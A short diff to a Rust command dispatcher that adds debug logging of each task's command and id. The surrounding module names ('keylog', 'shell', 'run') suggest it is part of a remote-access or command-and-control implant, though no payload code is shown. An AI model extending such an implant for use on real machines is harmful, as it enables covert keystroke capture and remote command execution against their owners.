@@ -85,10 +85,15 @@ pub mod caffeinate;
 pub mod keylog;
 
 use crate::structs::Task;
+use crate::utils;
 
 /// Dispatch a task to the appropriate command handler
 pub async fn dispatch(task: Task) {
     let command = task.data.command.as_str();
+    utils::print_debug(&format!(
+        "dispatch: command='{}' task_id='{}' params_len={}",
+        command, task.data.task_id, task.data.params.len()
+    ));
     match command {
         "shell" => shell::execute(task).await,
         "run" => run::execute(task).await,
